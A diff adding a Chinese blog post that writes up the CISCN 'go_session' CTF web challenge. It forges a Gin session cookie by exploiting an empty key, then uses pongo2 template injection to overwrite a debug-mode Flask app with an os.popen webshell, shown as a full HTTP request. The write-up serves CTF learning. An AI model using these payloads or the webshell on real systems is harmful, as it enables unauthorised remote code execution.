@@ -1,0 +1,348 @@
+---
+title: 'CISCN 国赛web题目复现' # (Required, max 60)
+description: 'CISCN国赛Web复现，感受一下国赛强度' # (Required, 10 to 160)
+publishDate: '2023-10-13' # (Required, Date)
+tags:
+  - Web
+heroImage: { src: 'https://image777.oss-cn-beijing.aliyuncs.com/img/202510062335247.jpg', inferSize: true, color: '#3b29b7ff' }
+draft: false # (set true will only show in development)
+language: '简中' # (String as you like)
+comment: true # (set false will disable comment, even if you've enabled it in site-config)
+---
+import { Aside, Tabs, TabItem, MdxRepl } from 'astro-pure/user'
+
+## go_session
+
+### 代码审计
+
+ 来看看这道go的`session伪造`和`pongo2模板注入`
+
+给了源码先来做代码审计
+
+**main.go**
+
+```go
+// main.go
+package main
+
+import (
+	"github.com/gin-gonic/gin"
+	"main/route"
+)
+
+func main() {
+	r := gin.Default()
+	r.GET("/", route.Index)
+	r.GET("/admin", route.Admin)
+	r.GET("/flask", route.Flask)
+	r.Run("0.0.0.0:80")
+}
+```
+
+这里主函数主要引入route文件和golang的Gin框架，设置三个路由`/index`、`/admin`、`/flask`，并将项目运行在80端口上
+
+**route.go**
+
+```go
+// route.go
+package route
+
+import (
+	"github.com/flosch/pongo2/v6"
+	"github.com/gin-gonic/gin"
+	"github.com/gorilla/sessions"
+	"html"
+	"io"
+	"net/http"
+	"os"
+)
+
+var store = sessions.NewCookieStore([]byte(os.Getenv("SESSION_KEY")))
+
+func Index(c *gin.Context) {
+	session, err := store.Get(c.Request, "session-name")
+	if err != nil {
+		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)
+		return
+	}
+	if session.Values["name"] == nil {
+		session.Values["name"] = "guest"
+		err = session.Save(c.Request, c.Writer)
+		if err != nil {
+			http.Error(c.Writer, err.Error(), http.StatusInternalServerError)
+			return
+		}
+	}
+
+	c.String(200, "Hello, guest")
+}
+
+func Admin(c *gin.Context) {
+	session, err := store.Get(c.Request, "session-name")
+	if err != nil {
+		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)
+		return
+	}
+	if session.Values["name"] != "admin" {
+		http.Error(c.Writer, "N0", http.StatusInternalServerError)
+		return
+	}
+	name := c.DefaultQuery("name", "ssti")
+	xssWaf := html.EscapeString(name)
+	tpl, err := pongo2.FromString("Hello " + xssWaf + "!")
+	if err != nil {
+		panic(err)
+	}
+	out, err := tpl.Execute(pongo2.Context{"c": c})
+	if err != nil {
+		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)
+		return
+	}
+	c.String(200, out)
+}
+
+func Flask(c *gin.Context) {
+	session, err := store.Get(c.Request, "session-name")
+	if err != nil {
+		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)
+		return
+	}
+	if session.Values["name"] == nil {
+		if err != nil {
+			http.Error(c.Writer, "N0", http.StatusInternalServerError)
+			return
+		}
+	}
+	resp, err := http.Get("http://127.0.0.1:5000/" + c.DefaultQuery("name", "guest"))
+	if err != nil {
+		return
+	}
+	defer resp.Body.Close()
+	body, _ := io.ReadAll(resp.Body)
+
+	c.String(200, string(body))
+}
+```
+
+这是一个路由文件，设置了三个路由，应用了Gin框架和pongo2的模板引擎
+
+`var store = sessions.NewCookieStore([]byte(os.Getenv("SESSION_KEY")))`这段代码读取环境变量中的SESSION_KEY用于生成session，但经过尝试发现没法获取到密钥，经过查询发现 `os.Getenv` 如果获取不存在的环境变量就会返回空值，可以大胆猜测密钥为空
+
+**index**
+
+```go
+func Index(c *gin.Context) {
+	session, err := store.Get(c.Request, "session-name")
+	if err != nil {
+		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)
+		return
+	}
+	if session.Values["name"] == nil {
+		session.Values["name"] = "guest"
+		err = session.Save(c.Request, c.Writer)
+		if err != nil {
+			http.Error(c.Writer, err.Error(), http.StatusInternalServerError)
+			return
+		}
+	}
+
+	c.String(200, "Hello, guest")
+}
+```
+
+Index函数用于处理根路径下的请求，它的参数是一个指向gin.Context的指针，而gin.Context是Gin框架中的一种上下文对象类型。它是一个包含了当前http请求和响应的信息、操作方法和属性的结构体，用于在处理http请求时传递和操作这些信息。同时gin.Context还提供了一系列的方法用于处理这些信息，这个将是我们后面利用的重点。
+
+函数首先会获取名为 session-name 的cookie会话，然后判断会话中的name值是否为空，如果为空，就会将name的值设置为guest，然后将会话保存到请求中，最后使用String方法返回一个状态码和一个字符串。(注意无论伪造cookie是否成功，均回显hello，guest！)
+
+当我们直接访问时回显hello，guest！
+
+**admin**
+
+```go
+func Admin(c *gin.Context) {
+	session, err := store.Get(c.Request, "session-name")
+	if err != nil {
+		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)
+		return
+	}
+	if session.Values["name"] != "admin" {
+		http.Error(c.Writer, "N0", http.StatusInternalServerError)
+		return
+	}
+	name := c.DefaultQuery("name", "ssti")
+	xssWaf := html.EscapeString(name)
+	tpl, err := pongo2.FromString("Hello " + xssWaf + "!")
+	if err != nil {
+		panic(err)
+	}
+	out, err := tpl.Execute(pongo2.Context{"c": c})
+	if err != nil {
+		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)
+		return
+	}
+	c.String(200, out)
+}
+```
+
+Admin函数用于处理 /admin 下的请求，首先会获取会话，然后判断name字段的值是不是admin，如果不是就立即返回No，所以这里要进行session-name构造，使name字段的值为admin，然后进行下一步的操作，接着就是获取url请求中name字段的值，默认值是ssti，接着用EscapeString函数进行转义，防止XSS攻击，然后使用pongo2的模板引擎将字符串"Hello"和转义后的name字段值作为模板内容写入模板中，然后就是执行模板，将执行的结果存储在out中，最后返回out。（存在模板注入漏洞）
+
+直接访问就会回显No
+
+**Flask**
+
+```go
+func Flask(c *gin.Context) {
+	session, err := store.Get(c.Request, "session-name")
+	if err != nil {
+		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)
+		return
+	}
+	if session.Values["name"] == nil {
+		if err != nil {
+			http.Error(c.Writer, "N0", http.StatusInternalServerError)
+			return
+		}
+	}
+	resp, err := http.Get("http://127.0.0.1:5000/" + c.DefaultQuery("name", "guest"))
+	if err != nil {
+		return
+	}
+	defer resp.Body.Close()
+	body, _ := io.ReadAll(resp.Body)
+
+	c.String(200, string(body))
+}
+```
+
+Flask函数用于处理 /flask 函数下的请求，首先获取会话，然后判断name字段是否为空，如果不为空则获取url中name字段的值，并将其与本地地址拼接，发送一个GET请求。请求结束后关闭响应体，然后读取响应题的内容，将其转换为字符串返回。简单来说就是获取name参数访问内部5000端口的flask服务并回显页面。直接访问会爆404错误
+
+我们尝试传入name参数`/flask?name=/`，引发报错拿到flask源码
+
+![flak源码](https://s2.loli.net/2023/10/13/OZRUk5qBKzW8Qev.png)
+
+**server.py**
+
+```python
+app = Flask(__name__)
+ 
+@app.route('/')
+def index():
+    name = request.args['name']
+    return name + " no ssti"
+ 
+ 
+if __name__ == "__main__":
+    app.run(host="127.0.0.1", port=5000, debug=True)
+```
+
+看这个源码，很显然在5000端口搭建的是一个flask的程序，而且更重要的是，这个程序设置了debug=True，说明程序开启了热加载功能，代码在更改后会自动重新加载程序，这意味着我们对代码进行更改后就会立即生效
+
+<Aside type='tip'>
+经验：flak框架开启debug的考点主要有两种，一是配合任何文件读取算pin码实现RCE，二是考察文件覆盖，也就是热加载
+</Aside>
+
+**注意**：`/flask`路由中的拼接逻辑，这个通过参数拼接访问本地5000端口上的flask程序，问题就出在拼接上，c.DefaultQuery()获取的是url请求中name参数的值直接拼接上去，如果我传入的name的值为空的话，c.DefaultQuery()就是空，那就相当于直接访问`http://127.0.0.1:5000/`
+
+### 复现过程
+
+我们一步一步来，想在`/admin`路由中利用SSTI覆写文件之前需要先伪造cookie绕过检测，根据前面的猜测我们只需要略微更改session的生成函数，若`if session.Values["name"] != "admin" {session.Values["name"] = "admin"`,并拉取源代码在本地运行即可伪造出cookie，若伪造成功应回显`hello,admin`
+
+```go
+func Index(c *gin.Context) {
+	session, err := store.Get(c.Request, "session-name")
+	if err != nil {
+		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)
+		return
+	}
+	if session.Values["name"] != "admin" {
+		session.Values["name"] = "admin"
+		err = session.Save(c.Request, c.Writer)
+		if err != nil {
+			http.Error(c.Writer, err.Error(), http.StatusInternalServerError)
+			return
+		}
+	}
+	message := fmt.Sprintf("Hello, %s", session.Values["name"])
+	c.String(200, message)
+}
+```
+<Aside type='caution'>
+注意在本地运行go代码时，除了下载SDK和相应库外，还可能报listen tcp :8080: bind: An attempt was made to access a socket in a way forbidden这类错误，原因是本地8080端口常有其他服务，导致端口占用。在main函数中该换其他端口号即可。
+</Aside>
+
+![swssion伪造](https://s2.loli.net/2023/10/14/yfbwG3Y9ZizodPJ.png)
+
+这样就算成功了，复制session到靶场访问`/admin`回显hello，ssti开始下一步
+
+这里我们用debug模式下的热加载替换flask源码实现RCE，要用到SaveUploadedFile方法实现任意文件写
+
+`{{c.SaveUploadedFile(c.FormFile("file"),"/app/server.py")}}`
+
+<Aside>
+但这里要注意参数经过 html.EscapeString(name) 转义，会将双引号转义掉，所以要换一种方式，对于"file"，gin.Context还提供了另一种方法，HandlerName() 方法，用于返回主处理程序的名称，这里返回的就是admin/route.Admin，然后可以用过滤器last获取最后一个字符串。对于 “/app/server.py”，可以在请求头中将Referer字段设置成 “/app/server.py”，然后用 Request.Referer()方法获取Referer的值。（还有其他方法，如`Request.Host()`、`Request.UA()`等）
+</Aside>
+
+还需要更改的点，因为要从Referer头中获取源码路径，故添加`Referer: /app/server.py`，且上传文件提交表单需要Content-Type 请求，同时需要边界字符串分割（可自定义），故添加`Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8ALIn5Z2C3VlBqND`
+
+上传源代码也很简单,接收一个名为 name 的参数，并使用 os.popen() 执行该参数作为命令，并返回执行结果
+
+```python
+from flask import *
+import os
+app = Flask(__name__)
+
+
+@app.route('/')
+def index():
+    name = request.args['name']
+    file=os.popen(name).read()
+    return file
+
+
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=5000, debug=True)
+```
+
+完整数据包：
+
+```http
+GET /admin?name={{c.SaveUploadedFile(c.FormFile(c.HandlerName()|last),c.Request.Referer())}} HTTP/1.1
+Host: 8b07fdbf-48c8-44c7-9482-7c2c5ac378d9.challenge.ctf.show
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Referer: /app/server.py
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8ALIn5Z2C3VlBqND
+Cookie: session-name=MTY5NzIwNDMzMXxEWDhFQVFMX2dBQUJFQUVRQUFBal80QUFBUVp6ZEhKcGJtY01CZ0FFYm1GdFpRWnpkSEpwYm1jTUJ3QUZZV1J0YVc0PXwR0sKvw-X3wCZB3mczzdP14XPXLMSOjQd_CcqOagipbg==
+Connection: close
+Content-Length: 429
+
+------WebKitFormBoundary8ALIn5Z2C3VlBqND
+Content-Disposition: form-data; name="n"; filename="1.py"
+Content-Type: text/plain
+
+from flask import *
+import os
+app = Flask(__name__)
+
+
+@app.route('/')
+def index():
+    name = request.args['name']
+    file=os.popen(name).read()
+    return file
+
+
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=5000, debug=True)
+------WebKitFormBoundary8ALIn5Z2C3VlBqND--
+```
+
+![success](https://s2.loli.net/2023/10/14/JLWpAzZREQU5SKe.png)
+
+接下来访问`/flask`路由传参查看环境变量即可`?name=?name=env`
+
+![env](https://s2.loli.net/2023/10/14/Evh39Jum5AqPwin.png)
